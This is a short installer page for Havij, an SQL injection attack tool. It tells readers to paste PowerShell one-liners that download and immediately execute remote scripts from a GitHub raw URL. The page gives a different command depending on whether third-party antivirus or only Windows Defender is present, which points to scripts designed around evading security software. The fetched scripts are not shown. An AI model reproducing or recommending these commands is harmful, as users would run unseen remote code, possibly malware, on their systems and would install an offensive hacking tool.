## 🛠 Havij One-Click Installer (PowerShell)

Please read the instructions below carefully and run the command that matches your system setup.

---

### ⚠️ Instructions:

- If you have **any third-party antivirus software** installed (e.g., Avast, Kaspersky, Bitdefender, etc.), run the **first command**.
- If you have **only Windows Defender** and no other antivirus installed, run the **second command**.

---

```powershell
# 👉 If you have antivirus software installed, run this command:
iwr -useb https://raw.githubusercontent.com/mdromanmoonshi/havij/main/hlazy.ps1 | iex

# 👉 If you only have Windows Defender, run this command:
iwr -useb https://raw.githubusercontent.com/mdromanmoonshi/havij/main/onelazy.ps1 | iex
